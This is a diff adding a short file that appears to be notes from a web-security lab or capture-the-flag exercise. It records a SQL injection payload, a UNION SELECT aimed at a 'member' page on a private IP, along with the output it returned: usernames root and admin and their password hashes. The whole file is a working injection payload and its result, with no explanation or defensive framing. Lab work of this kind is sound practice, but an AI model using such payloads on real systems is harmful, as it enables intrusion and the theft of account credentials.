@@ -1,0 +1,10 @@
+http://192.168.1.16/?page=member
+1 UNION SELECT id, username FROM Member_Brute_Force.db_default UNION SELECT id, password FROM Member_Brute_Force.db_default--
+
+id: 1
+username : root
+password : 3bf1114a986ba87ed28fc1b5884fc2f8
+
+id: 2
+username : admin
+password : 3bf1114a986ba87ed28fc1b5884fc2f8
